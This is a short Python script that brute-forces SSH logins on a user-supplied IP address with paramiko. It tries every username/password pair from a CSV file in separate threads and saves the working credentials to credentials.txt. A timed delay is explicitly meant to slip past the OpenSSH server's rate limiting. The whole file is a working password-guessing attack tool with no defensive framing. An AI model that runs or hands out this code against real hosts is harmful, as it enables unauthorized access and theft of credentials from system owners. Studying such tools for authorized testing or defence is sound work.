import csv
import ipaddress
import threading
import time
import logging
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception


# Function to connect to an ssh client
def ssh_connect(host, username, password):
    ssh_client = SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        ssh_client.connect(host,port=22,username=username, password=password, banner_timeout=300)
        # Write to a file the successful credentials.
        with open("credentials.txt", "a") as fh:
            # The actual writing.
            print(f"Username - {username} and Password - {password} found.")
            fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
    except AuthenticationException:
        print(f"Username - {username} and Password - {password} is Incorrect.")
    except ssh_exception.SSHException:
        print("**** Attempting to connect - Rate limiting on server ****")

# This function gets a valid IP address from the user. 
def get_ip_address():
    # We exit the loop only if the address is valid.
    while True:
        host = input("Please enter the host ip address: ")
        try:
            # If the address is valid we return the host.
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            # Otherwise retry.
            print("Please enter a valid ip address.")
            
        

# The program will start in the main function.
def __main__():
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
    list_file="passwords.csv"
    host = get_ip_address()
    # This function reads a csv file with passwords.
    with open(list_file) as fh:
        csv_reader = csv.reader(fh, delimiter=",")
        # We use the enumerate() on the csv_reader object. This allows us to access the index and the data.
        for index, row in enumerate(csv_reader):
            # The 0 index is where the headings are allocated.
            if index == 0:
                continue
            else:
                t = threading.Thread(target=ssh_connect, args=(host, row[0], row[1],))
                t.start()
                # Time interval crafted to avoid the rate limiting on openSSH server.
                time.sleep(1.0)

            

#  We run the main function where execution starts.
__main__()